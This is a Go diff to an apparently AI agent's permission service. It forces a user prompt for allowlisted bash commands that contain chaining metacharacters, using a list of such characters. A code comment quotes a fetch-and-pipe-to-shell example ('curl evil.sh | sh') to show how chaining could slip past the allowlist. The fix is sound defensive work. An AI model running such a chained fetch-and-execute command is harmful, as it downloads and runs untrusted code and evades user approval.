@@ -2,9 +2,11 @@ package permission
 
 import (
 	"context"
+	"encoding/json"
 	"os"
 	"path/filepath"
 	"slices"
+	"strings"
 	"sync"
 	"sync/atomic"
 
@@ -214,7 +216,19 @@ func (s *permissionService) Request(ctx context.Context, opts CreatePermissionRe
 
 	// Check if the tool/action combination is in the allowlist
 	commandKey := opts.ToolName + ":" + opts.Action
-	if slices.Contains(s.allowedTools, commandKey) || slices.Contains(s.allowedTools, opts.ToolName) {
+	shortCircuit := slices.Contains(s.allowedTools, commandKey) || slices.Contains(s.allowedTools, opts.ToolName)
+	// Security: do not short-circuit for bash commands that contain
+	// chaining metacharacters (&&, ;, |, $(), backticks). A pattern
+	// like `bash go build*` should not auto-approve
+	// `go build ./... && curl evil.sh | sh` because the allowlist
+	// check is a simple prefix match against the whole command string.
+	// Force the prompt so the user sees the full chained command.
+	if shortCircuit && opts.ToolName == "bash" && opts.Action == "execute" {
+		if cmd := extractBashCommand(opts.Params); containsCommandChaining(cmd) {
+			shortCircuit = false
+		}
+	}
+	if shortCircuit {
 		return true, nil
 	}
 
@@ -400,4 +414,47 @@ func NewPermissionService(workingDir string, skip bool, allowedTools []string, o
 	}
 	svc.skip.Store(skip)
 	return svc
+}
+
+// bashCommandParam is the shape of the Params field when a bash tool calls
+// Request. Kept internal to avoid importing the tools package (which would
+// create a cyclic dependency).
+type bashCommandParam struct {
+	Command string `json:"command"`
+}
+
+// extractBashCommand pulls the command string out of a permission request's
+// Params field. Returns the empty string when Params is nil or not a bash
+// command struct — callers should treat that as "unknown" and fall through
+// to the normal prompt path.
+func extractBashCommand(params any) string {
+	if params == nil {
+		return ""
+	}
+	b, err := json.Marshal(params)
+	if err != nil {
+		return ""
+	}
+	var p bashCommandParam
+	if err := json.Unmarshal(b, &p); err != nil {
+		return ""
+	}
+	return p.Command
+}
+
+// chainingMetacharacters are shell metacharacters that enable command
+// chaining or substitution. When present in a bash command, the allowlist
+// short-circuit is skipped so the user sees the full command before
+// approving.
+var chainingMetacharacters = []string{"&&", ";", "|", "$(", "`"}
+
+// containsCommandChaining reports whether s contains shell metacharacters
+// that enable command chaining or substitution.
+func containsCommandChaining(s string) bool {
+	for _, c := range chainingMetacharacters {
+		if strings.Contains(s, c) {
+			return true
+		}
+	}
+	return false
 }
